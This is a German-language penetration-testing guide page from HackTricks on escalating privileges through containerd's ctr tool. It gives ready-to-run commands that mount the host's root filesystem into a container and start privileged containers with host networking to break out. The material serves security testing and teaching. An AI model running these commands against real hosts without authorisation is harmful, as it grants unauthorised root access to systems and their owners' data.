# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Gehe zum folgenden Link, um zu erfahren, **wo `containerd` und `ctr` im Container-Stack einzuordnen sind**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Wenn du feststellst, dass ein Host den Befehl `ctr` enthält, die native CLI, die mit containerd gebündelt ist:<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
Du kannst die containerd bekannten Images auflisten:<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Dann **führen Sie eines dieser Images aus, wobei das Host-Root rekursiv in das Container-Root eingebunden wird**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Führe einen Container im privileged mode aus und teste auf einen Escape.\
Du kannst einen privileged Container mit Host-Netzwerk wie folgt ausführen:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` gewährt dem Prozess die effektiven Linux-Capabilities des Aufrufers und entfernt mehrere Isolationskontrollen, aber ein Escape bleibt umgebungsabhängig; verwende die auf der folgenden Seite erwähnten Techniken, um dies zu testen:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [Erste Schritte mit containerd](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [Implementierung des `ctr image`-Befehls](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [Implementierung des `ctr run`-Befehls](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Dokumentation zu gemeinsam genutzten Linux-Kernel-Subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [containerd-OCI-Paket: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [Flags des containerd-`ctr`-Befehls](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
